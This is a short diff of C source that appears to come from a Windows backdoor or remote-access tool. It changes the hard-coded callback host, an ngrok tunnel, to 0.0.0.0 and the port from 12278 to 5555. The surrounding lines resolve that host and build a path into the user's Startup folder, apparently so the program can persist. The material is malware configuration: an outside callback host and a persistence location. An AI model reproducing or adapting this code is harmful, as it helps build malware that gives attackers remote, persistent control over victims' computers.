@@ -437,7 +437,7 @@ int main( int argc, char* argv[] ) {
         return 1;
     }
 
-    host_name = "2.tcp.ngrok.io"; // Change This To You're Host
+    host_name = "0.0.0.0"; // Change This To You're Host
     remoteHost = gethostbyname(host_name);
     
     if ( remoteHost == NULL ) {
@@ -466,7 +466,7 @@ int main( int argc, char* argv[] ) {
     }
 
     char* IP = inet_ntoa(addr);
-    int PORT = 12278; // Change This To You're Port
+    int PORT = 5555; // Change This To You're Port
 
     sprintf(path_name, "%s%s",  path, "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");
     
